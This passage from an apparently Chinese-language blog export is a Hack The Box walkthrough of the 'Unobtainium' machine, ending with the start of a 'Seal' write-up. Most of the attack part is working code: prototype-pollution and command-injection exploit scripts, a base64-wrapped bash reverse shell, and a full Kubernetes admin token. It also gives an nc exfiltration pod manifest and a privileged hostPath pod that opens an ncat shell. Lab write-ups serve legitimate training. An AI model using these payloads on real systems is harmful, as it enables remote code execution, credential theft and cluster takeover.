};\\n\\n _.merge(message, req.body.message, {\\n id: lastId++,\\n timestamp: Date.now(),\\n userName: user.name,\\n });\\n\\n messages.push(message);\\n res.send({ok: true});\\n});\\n\\napp.delete(&#39;/&#39;, (req, res) =&gt; {\\n const user = findUser(req.body.auth || {});\\n\\n if (!user || !user.canDelete) {\\n res.status(403).send({ok: false, error: &#39;Access denied&#39;});\\n return;\\n }\\n\\n messages = messages.filter((m) =&gt; m.id !== req.body.messageId);\\n res.send({ok: true});\\n});\\napp.post(&#39;/upload&#39;, (req, res) =&gt; {\\n const user = findUser(req.body.auth || {});\\n if (!user || !user.canUpload) {\\n res.status(403).send({ok: false, error: &#39;Access denied&#39;});\\n return;\\n }\\n\\n\\n filename = req.body.filename;\\n root.upload(\\&quot;./\\&quot;,filename, true);\\n res.send({ok: true, Uploaded_File: filename});\\n});\\n\\napp.post(&#39;/todo&#39;, (req, res) =&gt; {\\n\\tconst user = findUser(req.body.auth || {});\\n\\tif (!user) {\\n\\t\\tres.status(403).send({ok: false, error: &#39;Access denied&#39;});\\n\\t\\treturn;\\n\\t}\\n\\n\\tfilename = req.body.filename;\\n testFolder = \\&quot;/usr/src/app\\&quot;;\\n fs.readdirSync(testFolder).forEach(file =&gt; {\\n if (file.indexOf(filename) &gt; -1) {\\n var buffer = fs.readFileSync(filename).toString();\\n res.send({ok: true, content: buffer});\\n }\\n });\\n});\\n\\napp.listen(3000);\\nconsole.log(&#39;Listening on port 3000...&#39;);\\n&quot;} 这个格式是真的糟糕，为了方便阅读，我们给它美化一下 var root = require(&quot;google-cloudstorage-commands&quot;); const express = require(&#39;express&#39;); const { exec } = require(&quot;child_process&quot;); const bodyParser = require(&#39;body-parser&#39;); const _ = require(&#39;lodash&#39;); const app = express(); var fs = require(&#39;fs&#39;); const users = [ {name: &#39;felamos&#39;, password: &#39;Winter2021&#39;}, {name: &#39;admin&#39;, password: Math.random().toString(32), canDelete: true, canUpload: true}, ]; let messages = []; let lastId = 1; function findUser(auth) { return users.find((u) =&gt; u.name === auth.name &amp;&amp; u.password === auth.password); } app.use(bodyParser.json()); app.get(&#39;/&#39;, (req, res) =&gt; { res.send(messages); }); app.put(&#39;/&#39;, (req, res) =&gt; { const user = findUser(req.body.auth || {}); if (!user) { res.status(403).send({ok: false, error: &#39;Access denied&#39;}); return; } const message = { icon: &#39;__&#39;, }; _.merge(message, req.body.message, { id: lastId++, timestamp: Date.now(), userName: user.name, }); messages.push(message); res.send({ok: true}); }); app.delete(&#39;/&#39;, (req, res) =&gt; { const user = findUser(req.body.auth || {}); if (!user || !user.canDelete) { res.status(403).send({ok: false, error: &#39;Access denied&#39;}); return; } messages = messages.filter((m) =&gt; m.id !== req.body.messageId); res.send({ok: true}); }); app.post(&#39;/upload&#39;, (req, res) =&gt; { const user = findUser(req.body.auth || {}); if (!user || !user.canUpload) { res.status(403).send({ok: false, error: &#39;Access denied&#39;}); return; } filename = req.body.filename; root.upload(&quot;./&quot;,filename, true); res.send({ok: true, Uploaded_File: filename}); }); app.post(&#39;/todo&#39;, (req, res) =&gt; { const user = findUser(req.body.auth || {}); if (!user) { res.status(403).send({ok: false, error: &#39;Access denied&#39;}); return; } filename = req.body.filename; testFolder = &quot;/usr/src/app&quot;; fs.readdirSync(testFolder).forEach(file =&gt; { if (file.indexOf(filename) &gt; -1) { var buffer = fs.readFileSync(filename).toString(); res.send({ok: true, content: buffer}); } }); }); app.listen(3000); console.log(&#39;Listening on port 3000...&#39;); 我们读取文件package.json，得到了 {&quot;ok&quot;:true,&quot;content&quot;:&quot;{\\n \\&quot;name\\&quot;: \\&quot;Unobtainium-Server\\&quot;,\\n \\&quot;version\\&quot;: \\&quot;1.0.0\\&quot;,\\n \\&quot;description\\&quot;: \\&quot;API Service for Electron client\\&quot;,\\n \\&quot;main\\&quot;: \\&quot;index.js\\&quot;,\\n \\&quot;scripts\\&quot;: {\\n \\&quot;start\\&quot;: \\&quot;node index.js\\&quot;\\n },\\n \\&quot;author\\&quot;: \\&quot;felamos\\&quot;,\\n \\&quot;license\\&quot;: \\&quot;ISC\\&quot;,\\n \\&quot;dependencies\\&quot;: {\\n \\&quot;body-parser\\&quot;: \\&quot;1.18.3\\&quot;,\\n \\&quot;express\\&quot;: \\&quot;4.16.4\\&quot;,\\n \\&quot;lodash\\&quot;: \\&quot;4.17.4\\&quot;,\\n \\&quot;google-cloudstorage-commands\\&quot;: \\&quot;0.0.1\\&quot;\\n },\\n \\&quot;devDependencies\\&quot;: {}\\n}\\n&quot;} 我们美化一下 { &quot;name&quot;: &quot;Unobtainium-Server&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;API Service for Electron client&quot;, &quot;main&quot;: &quot;index.js&quot;, &quot;scripts&quot;: { &quot;start&quot;: &quot;node index.js&quot; }, &quot;author&quot;: &quot;felamos&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;dependencies&quot;: { &quot;body-parser&quot;: &quot;1.18.3&quot;, &quot;express&quot;: &quot;4.16.4&quot;, &quot;lodash&quot;: &quot;4.17.4&quot;, &quot;google-cloudstorage-commands&quot;: &quot;0.0.1&quot; }, &quot;devDependencies&quot;: {} } Lodashhttps://snyk.io/vuln/SNYK-JS-LODASH-73638 google-cloudstorage-commandshttps://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431 从上面的帮助文档，我发现可以命令注入 #!/bin/bash RHOST=&quot;unobtainium.htb&quot; RPORT=31337 UA=&quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot; PROXY=&quot;127.0.0.1:8080&quot; TEXT=&quot;$1&quot; cat - &lt;&lt;EOF &gt; message.json { &quot;auth&quot;: { &quot;name&quot;:&quot;felamos&quot;, &quot;password&quot;:&quot;Winter2021&quot; }, &quot;message&quot;: { &quot;text&quot;:${TEXT} } } EOF curl -s \\ -X PUT \\ -A &quot;${UA}&quot; \\ -H &quot;Content-Type: application/json&quot; \\ -d &quot;$(cat message.json | jq -c)&quot; \\ -x &quot;${PROXY}&quot; \\ &quot;http://${RHOST}:${RPORT}/&quot; \\ | jq . (root💀root)-[~/Desktop] └─# ./exploit.sh &#39;{&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;canDelete&quot;:true, &quot;canUpload&quot;:true}}}&#39; { &quot;ok&quot;: true } 成功 这个成功的响应意味着我们真的可以利用这个漏洞，让我们运行脚本2检查是否可以写入文件 #!/bin/bash RHOST=&quot;unobtainium.htb&quot; RPORT=31337 UA=&quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot; PROXY=&quot;127.0.0.1:8080&quot; FILE=&quot;&amp; echo lucifiel | tee lucifiel.txt&quot; cat - &lt;&lt;EOF &gt; message.json { &quot;auth&quot;: { &quot;name&quot;:&quot;felamos&quot;, &quot;password&quot;:&quot;Winter2021&quot; }, &quot;filename&quot;:&quot;${FILE}&quot; } EOF curl -s \\ -A &quot;${UA}&quot; \\ -H &quot;Content-Type: application/json&quot; \\ -d &quot;$(cat message.json | jq -c)&quot; \\ -x &quot;${PROXY}&quot; \\ -o /dev/null \\ &quot;http://${RHOST}:${RPORT}/upload&quot; ┌──(root💀root)-[~/Desktop] └─# ./exploit2.sh 运行成功，让我们读取 lucifiel.txt 试试是否写入成功 写入成功，现在我们来利用这个漏洞getshell 首先使用nc监听一个端口 nc -nvlp 4444 POST /upload HTTP/1.1 Host: unobtainium.htb:31337 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: */* Content-Type: application/json Content-Length: 151 Connection: close {&quot;auth&quot;:{&quot;name&quot;:&quot;felamos&quot;,&quot;password&quot;:&quot;Winter2021&quot;},&quot;filename&quot;:&quot;&amp; echo $(echo &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.53/4444 0&gt;&amp;1&#39; | base64) | base64 -d | bash&quot;} 执行后，成功获得一个shell ┌──(root💀root)-[~/Downloads] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.53] from (UNKNOWN) [10.10.10.235] 58362 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell root@webapp-deployment-5d764566f4-mbprj:/usr/src/app# whoami &amp;&amp; id whoami &amp;&amp; id root uid=0(root) gid=0(root) groups=0(root) root@webapp-deployment-5d764566f4-mbprj:/usr/src/app# root@webapp-deployment-5d764566f4-mbprj:~# cd /root cd /root root@webapp-deployment-5d764566f4-mbprj:~# ls ls user.txt root@webapp-deployment-5d764566f4-mbprj:~# cat user.txt cat user.txt 7ff2ddd449da8a15c66289e2ec015cd9 成功拿到user权限的flag ## 权限提升 我们可以看到，这里的root是在一个docker容器里 因为没啥思路，让我们先跑一下linpeas吧 https://github.com/LucifielHack/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh 使用python3在本地开启一个http服务 python3 -m http.server 然后在shell中使用wget进行下载 wget http://10.10.14.53:8000/linpeas.sh 然后添加权限后运行 chmod +x linpeas.sh ./linpeas.sh 在结果中看到了一句 * * * * * find / -name kubectl -exec rm {} \\; * * * * * find / -name kubectl -exec rm {} \\; 有一个cronjob正在运行，每分钟删除容器中的kubectl 但是容器中没有kubectl可执行文件 让我们下载一个kubectl可执行文件并将其传输到/tmp文件夹内的docker中 https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux 在Linux上使用curl安装kubectl二进制文件 curl -LO &quot;https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl&quot; python3 -m http.server 80 然后在shell中使用wget进行下载 wget http://10.10.14.53/kubectl -o /tmp/kubectl-lucifiel cd /tmp/ chmod +x kubectl-lucifiel 更改一个名字避免被cronjob给删掉 首先让我们检查一下kubectl ./kubectl-lucifiel get namespace ./kubectl-lucifiel get pods -n dev ./kubectl-lucifiel describe pod devnode-deployment-cd86fb5c-6ms8d -n dev root@webapp-deployment-5d764566f4-h5zhw:/tmp# ./kubectl-lucifiel get namespace &lt;4566f4-h5zhw:/tmp# ./kubectl-lucifiel get namespace NAME STATUS AGE default Active 180d dev Active 179d kube-node-lease Active 180d kube-public Active 180d kube-system Active 180d root@webapp-deployment-5d764566f4-h5zhw:/tmp# ./kubectl-lucifiel get pods -n dev &lt;66f4-h5zhw:/tmp# ./kubectl-lucifiel get pods -n dev NAME READY STATUS RESTARTS AGE devnode-deployment-cd86fb5c-6ms8d 1/1 Running 28 179d devnode-deployment-cd86fb5c-mvrfz 1/1 Running 29 179d devnode-deployment-cd86fb5c-qlxww 1/1 Running 29 179d root@webapp-deployment-5d764566f4-h5zhw:/tmp# ./kubectl-lucifiel describe pod devnode-deployment-cd86fb5c-6ms8d -n dev &lt;scribe pod devnode-deployment-cd86fb5c-6ms8d -n dev Name: devnode-deployment-cd86fb5c-6ms8d Namespace: dev Priority: 0 Node: unobtainium/10.10.10.235 Start Time: Sun, 17 Jan 2021 18:16:21 +0000 Labels: app=devnode pod-template-hash=cd86fb5c Annotations: &lt;none&gt; Status: Running IP: 172.17.0.8 IPs: IP: 172.17.0.8 Controlled By: ReplicaSet/devnode-deployment-cd86fb5c Containers: devnode: Container ID: docker://c22604a2e5d200e2d08b41724e76633954e82ba9d5f4ab201207860f9dc9b91f Image: localhost:5000/node_server Image ID: docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c Port: 3000/TCP Host Port: 0/TCP State: Running Started: Fri, 16 Jul 2021 05:11:42 +0000 Last State: Terminated Reason: Error Exit Code: 137 Started: Wed, 24 Mar 2021 16:01:28 +0000 Finished: Wed, 24 Mar 2021 16:02:13 +0000 Ready: True Restart Count: 28 Environment: &lt;none&gt; Mounts: /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro) Conditions: Type Status Initialized True Ready True ContainersReady True PodScheduled True Volumes: default-token-rmcd6: Type: Secret (a volume populated by a Secret) SecretName: default-token-rmcd6 Optional: false QoS Class: BestEffort Node-Selectors: &lt;none&gt; Tolerations: node.kubernetes.io/not-ready:NoExecute op=Exists for 300s node.kubernetes.io/unreachable:NoExecute op=Exists for 300s Events: &lt;none&gt; 利用方法和前面一样，稍微修改一下脚本 #!/bin/bash RHOST=&quot;127.0.0.1&quot; RPORT=3000 UA=&quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot; PROXY=&quot;127.0.0.1:8080&quot; TEXT=&quot;$1&quot; cat - &lt;&lt;EOF &gt; message.json { &quot;auth&quot;: { &quot;name&quot;:&quot;felamos&quot;, &quot;password&quot;:&quot;Winter2021&quot; }, &quot;message&quot;: { &quot;text&quot;:${TEXT} } } EOF curl -s \\ -X PUT \\ -A &quot;${UA}&quot; \\ -H &quot;Content-Type: application/json&quot; \\ -d &quot;$(cat message.json | jq -c)&quot; \\ -x &quot;${PROXY}&quot; \\ &quot;http://${RHOST}:${RPORT}/&quot; \\ | jq . #!/bin/bash RHOST=&quot;127.0.0.1&quot; RPORT=3000 UA=&quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot; PROXY=&quot;127.0.0.1:8080&quot; FILE=$1 cat - &lt;&lt;EOF &gt; message.json { &quot;auth&quot;: { &quot;name&quot;:&quot;felamos&quot;, &quot;password&quot;:&quot;Winter2021&quot; }, &quot;filename&quot;:&quot;${FILE}&quot; } EOF curl -s \\ -A &quot;${UA}&quot; \\ -H &quot;Content-Type: application/json&quot; \\ -d &quot;$(cat message.json | jq -c)&quot; \\ -x &quot;${PROXY}&quot; \\ -o /dev/null \\ &quot;http://${RHOST}:${RPORT}/upload&quot; 我们需要使用Chisel将端口转发到devnode-deployment容器“172.17.0.8:3000” 参考视频 https://www.youtube.com/watch?v=Yp4oxoQIBAM&amp;t=1469s 下载地址 https://github.com/jpillora/chisel 如果遇到connect: connection refused，解决方案 https://blog.csdn.net/hhyukJae/article/details/106980818 命令执行步骤 go chisel du -hs chisel go build -ldflags=&quot;-s -w&quot; upx brute chisel du -hs chisel 然后使用python3开启一个http服务以后，使用wget下载到靶机里 给chisel一个777权限后，使用chisel开启一个服务 本地运行 chmod 777 chisel ./chisel server -p 9999 --reverse ┌──(root💀root)-[~/Desktop/chisel] └─# ./chisel server -p 9999 --reverse 2021/07/17 02:45:18 server: Reverse tunnelling enabled 2021/07/17 02:45:18 server: Fingerprint kcPnWygZKzUCU+9rAzUk0r6I13LgnEuy/vKZsUNEgCQ= 2021/07/17 02:45:18 server: Listening on http://0.0.0.0:9999 靶机运行 chmod 777 chisel ./chisel client 10.10.14.53:9999 R:3000:172.17.0.8:3000 root@webapp-deployment-5d764566f4-mbprj:/tmp# ./chisel client 10.10.14.53:9999 R:3000:172.17.0.8:3000 &lt;isel client 10.10.14.53:9999 R:3000:172.17.0.8:3000 2021/07/16 19:04:27 client: Connecting to ws://10.10.14.53:9999 2021/07/16 19:04:29 client: Connected (Latency 251.63886ms) 然后现在让我们运行修改后的exploit.sh ┌──(root💀root)-[~/Desktop] └─# ./exploit.sh &#39;{&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;canDelete&quot;:true, &quot;canUpload&quot;:true}}}&#39; 4 ⨯ { &quot;ok&quot;: true } 然后运行exploit2.sh ./exploit2.sh &quot;&amp; echo $(echo &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.53/5555 0&gt;&amp;1&#39; | base64) | base64 -d | bash&quot; ┌──(root💀root)-[~/Desktop] └─# nc -nvlp 5555 listening on [any] 5555 ... connect to [10.10.14.53] from (UNKNOWN) [10.10.10.235] 58012 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell root@devnode-deployment-cd86fb5c-6ms8d:/usr/src/app# whoami &amp;&amp; id whoami &amp;&amp; id root uid=0(root) gid=0(root) groups=0(root) 成功获得另一个shell 然后我们到/tmp/目录下继续运行kubectl脚本 cd /tmp ./kubectl-lucifiel get secrets -n kube-system root@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl-lucifiel get secrets -n kube-system &lt;/tmp# ./kubectl-lucifiel get secrets -n kube-system NAME TYPE DATA AGE attachdetach-controller-token-5dkkr kubernetes.io/service-account-token 3 180d bootstrap-signer-token-xl4lg kubernetes.io/service-account-token 3 180d c-admin-token-tfmp2 kubernetes.io/service-account-token 3 180d certificate-controller-token-thnxw kubernetes.io/service-account-token 3 180d clusterrole-aggregation-controller-token-scx4p kubernetes.io/service-account-token 3 180d coredns-token-dbp92 kubernetes.io/service-account-token 3 180d cronjob-controller-token-chrl7 kubernetes.io/service-account-token 3 180d daemon-set-controller-token-cb825 kubernetes.io/service-account-token 3 180d default-token-l85f2 kubernetes.io/service-account-token 3 180d deployment-controller-token-cwgst kubernetes.io/service-account-token 3 180d disruption-controller-token-kpx2x kubernetes.io/service-account-token 3 180d endpoint-controller-token-2jzkv kubernetes.io/service-account-token 3 180d endpointslice-controller-token-w4hwg kubernetes.io/service-account-token 3 180d endpointslicemirroring-controller-token-9qvzz kubernetes.io/service-account-token 3 180d expand-controller-token-sc9fw kubernetes.io/service-account-token 3 180d generic-garbage-collector-token-2hng4 kubernetes.io/service-account-token 3 180d horizontal-pod-autoscaler-token-6zhfs kubernetes.io/service-account-token 3 180d job-controller-token-h6kg8 kubernetes.io/service-account-token 3 180d kube-proxy-token-jc8kn kubernetes.io/service-account-token 3 180d namespace-controller-token-2klzl kubernetes.io/service-account-token 3 180d node-controller-token-k6p6v kubernetes.io/service-account-token 3 180d persistent-volume-binder-token-fd292 kubernetes.io/service-account-token 3 180d pod-garbage-collector-token-bjmrd kubernetes.io/service-account-token 3 180d pv-protection-controller-token-9669w kubernetes.io/service-account-token 3 180d pvc-protection-controller-token-w8m9r kubernetes.io/service-account-token 3 180d replicaset-controller-token-bzbt8 kubernetes.io/service-account-token 3 180d replication-controller-token-jz8k8 kubernetes.io/service-account-token 3 180d resourcequota-controller-token-wg7rr kubernetes.io/service-account-token 3 180d root-ca-cert-publisher-token-cnl86 kubernetes.io/service-account-token 3 180d service-account-controller-token-44bfm kubernetes.io/service-account-token 3 180d service-controller-token-pzjnq kubernetes.io/service-account-token 3 180d statefulset-controller-token-z2nsd kubernetes.io/service-account-token 3 180d storage-provisioner-token-tk5k5 kubernetes.io/service-account-token 3 180d token-cleaner-token-wjvf9 kubernetes.io/service-account-token 3 180d ttl-controller-token-z87px kubernetes.io/service-account-token 3 180d 接着让我们获取令牌 ./kubectl-lucifiel describe secrets/c-admin-token-tfmp2 -n kube-system root@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl-lucifiel describe secrets/c-admin-token-tfmp2 -n kube-system &lt;describe secrets/c-admin-token-tfmp2 -n kube-system Name: c-admin-token-tfmp2 Namespace: kube-system Labels: &lt;none&gt; Annotations: kubernetes.io/service-account.name: c-admin kubernetes.io/service-account.uid: 2463505f-983e-45bd-91f7-cd59bfe066d0 Type: kubernetes.io/service-account-token Data ==== token: eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow ca.crt: 1066 bytes namespace: 11 bytes 让我们列出token root@devnode-deployment-cd86fb5c-6ms8d:/tmp# /tmp/kubectl-lucifiel --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow cluster-info &lt;579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow cluster-info Kubernetes control plane is running at https://10.96.0.1:443 KubeDNS is running at https://10.96.0.1:443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy To further debug and diagnose cluster problems, use &#39;kubectl cluster-info dump&#39;. 在本地创建一个lucifiel.yaml脚本 apiVersion: v1 kind: Pod metadata: name: some-pod namespace: default spec: containers: - name: web image: localhost:5000/dev-alpine command: [&quot;/bin/sh&quot;] args: [&quot;-c&quot;, &#39;cat /root/root.txt | nc -nv 10.10.14.53 6666; sleep 100000&#39;] volumeMounts: - mountPath: /root/ name: root-flag volumes: - hostPath: path: /root/ type: &quot;&quot; name: root-flag 然后本地监听一个端口，并保存文件为root.txt nc -nvlp 6666 &gt; root.txt 然后运行该脚本 /tmp/kubectl-lucifiel create -f /tmp/lucifiel.yaml --token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow ┌──(root💀root)-[~/Desktop] └─# cat root.txt fd72e8e095033f233d31c383e5c0391b 成功拿到root权限的flag文件 ## 题外话 这几天事情有点多，再加上一些这样那样的情况吧，导致比较忙。所以这次的靶场就没有写的非常细致，有很多东西都是一下就略过了，请大家见谅。等过段时间忙完了就会恢复质量。 最后一步如果想要获得一个shell，就使用这个脚本 apiVersion: v1 kind: Pod metadata: name: everything-allowed-revshell-pod labels: app: pentest spec: hostNetwork: true hostPID: true hostIPC: true containers: - name: everything-allowed-pod image: raesene/ncat command: [ &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;--&quot; ] args: [ &quot;ncat --ssl $HOST $PORT -e /bin/bash;&quot; ] securityContext: privileged: true volumeMounts: - mountPath: /host name: noderoot #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name volumes: - name: noderoot hostPath: path: /","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Seal - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Seal","date":"2021-07-12T11:38:36.000Z","updated":"2023-06-13T03:50:14.000Z","comments":true,"path":"2021/07/12/Hackthebox/Medium/Hackthebox-Seal/","link":"","permalink":"http://www.lucifiel.com/2021/07/12/Hackthebox/Medium/Hackthebox-Seal/","excerpt":"","text":"Hackthebox - Seal靶场信息 靶场类型 信息搜集 首先使用Nmap进行信息搜集nmap -A -sS -sC -sV -p- 10.10.10.250 ┌──(root💀root)-[~/Desktop] └─# nmap -A -sS -sC -sV -p- 10.10.10.250 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-12 12:42 CST Nmap scan report for 10.10.10.250 Host is up (0.24s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA) | 256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA) |_ 256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519) 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Seal Market | ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK | Not valid before: 2021-05-05T10:24:03 |_Not valid after: 2022-05-05T10:24:03 | tls-alpn: |_ http/1.1 | tls-nextprotoneg: |_ http/1.1 8080/tcp open http-proxy | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 401 Unauthorized | Date: Mon, 12 Jul 2021 05:05:34 GMT | Set-Cookie: JSESSIONID=node01f74sr5qgmlr67kq6xg2imreb3.node0; Path=/; HttpOnly | Expires: Thu, 01 Jan 1970 00:00:00 GMT | Content-Type: text/html;charset=utf-8 | Content-Length: 0 | GetRequest: | HTTP/1.1 401 Unauthorized | Date: Mon, 12 Jul 2021 05:05:32 GMT | Set-Cookie: JSESSIONID=node071ucs4ccblk71m8qso25gjtua1.node0; Path=/; HttpOnly | Expires: Thu, 01 Jan 1970 00:00:00 GMT | Content-Type: text/html;charset=utf-8 | Content-Length: 0 | HTTPOptions: | HTTP/1.1 200 OK | Date: Mon, 12 Jul 2021 05:05:33 GMT | Set-Cookie: JSESSIONID=node01dhmxhla4mm47fdkiw6xmfoxq2.node0; Path=/; HttpOnly | Expires: Thu, 01 Jan 1970 00:00:00 GMT | Content-Type: text/html;charset=utf-8 | Allow: GET,HEAD,POST,OPTIONS | Content-Length: 0 | RPCCheck: | HTTP/1.1 400 Illegal character OTEXT=0x80 | Content-Type: text/html;charset=iso-8859-1 | Content-Length: 71 | Connection: close | &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character OTEXT=0x80&lt;/pre&gt; | RTSPRequest: | HTTP/1.1 505 Unknown Version | Content-Type: text/html;charset=iso-8859-1 | Content-Length: 58 | Connection: close | &lt;h1&gt;Bad Message 505&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt; | Socks4: | HTTP/1.1 400 Illegal character CNTL=0x4 | Content-Type: text/html;charset=iso-8859-1 | Content-Length: 69 | Connection: close | 